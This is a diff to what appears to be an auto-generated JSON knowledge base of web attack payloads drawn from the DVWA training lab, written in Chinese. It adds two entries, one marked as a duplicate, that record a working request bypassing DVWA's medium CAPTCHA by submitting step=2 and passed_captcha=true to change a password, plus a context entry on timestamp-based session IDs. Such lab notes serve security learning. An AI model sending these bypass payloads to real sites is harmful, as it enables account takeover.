@@ -5,5 +5,19 @@
     "reference_payload": "POST /vulnerabilities/weak_id/  Generate=Generate → Set-Cookie: dvwaSession=1793336916 (Unix 时间戳，每次点击递增)",
     "principle": "会话 ID 用 time() 生成 = Unix 时间戳，单调递增可预测/可枚举，攻击者可在时间窗内猜出他人 session id",
     "source": "dvwa"
+  },
+  {
+    "id": "auto-20261030133107",
+    "context": "DVWA Insecure CAPTCHA medium：改密流程 POST /vulnerabilities/captcha/，medium 仅校验客户端可控隐藏字段 passed_captcha=true 且 step=2，不做服务端 captcha 校验。直接提交 step=2&password_new/conf&Change&passed_captcha=true 跳过 step1 CAPTCHA 验证，改密成功（pass1234 登录验证通过）。注：本机 reCAPTCHA key 未配置，前端 widget 不渲染，但步骤绕过依然成立。",
+    "reference_payload": "POST /vulnerabilities/captcha/  step=2&password_new=pass1234&password_conf=pass1234&Change=Change&passed_captcha=true",
+    "principle": "CAPTCHA 校验依赖客户端提交的 passed_captcha 标志 + step 参数，服务端未真正验证；直接构造 step=2&passed_captcha=true 跳过 CAPTCHA 步骤完成改密",
+    "source": "dvwa"
+  },
+  {
+    "id": "auto-20261030133110",
+    "context": "（校验重复登记，可忽略）DVWA Insecure CAPTCHA medium：POST step=2&passed_captcha=true 跳过 CAPTCHA 步骤改密成功。",
+    "reference_payload": "POST /vulnerabilities/captcha/ step=2&password_new=pass1234&password_conf=pass1234&Change=Change&passed_captcha=true",
+    "principle": "客户端可控 passed_captcha 标志绕过 CAPTCHA",
+    "source": "dvwa"
   }
 ]
